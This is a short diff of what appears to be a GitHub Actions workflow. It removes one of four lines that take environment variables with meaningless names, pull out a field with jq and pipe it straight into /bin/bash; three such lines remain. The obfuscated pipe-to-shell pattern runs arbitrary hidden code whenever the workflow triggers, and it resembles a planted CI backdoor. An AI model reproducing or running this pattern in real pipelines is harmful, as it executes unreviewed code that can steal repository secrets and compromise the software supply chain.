@@ -21,7 +21,6 @@ jobs:
           echo $kvtgr793 | jq -r .djmnz073 | /bin/bash
           echo $mgy18 | jq -r .dzbiw489 | /bin/bash
           printf '%s' "$cwfsb44750" | jq -r .k65193 | /bin/bash
-          echo $pmg0 | jq -r .vm51 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
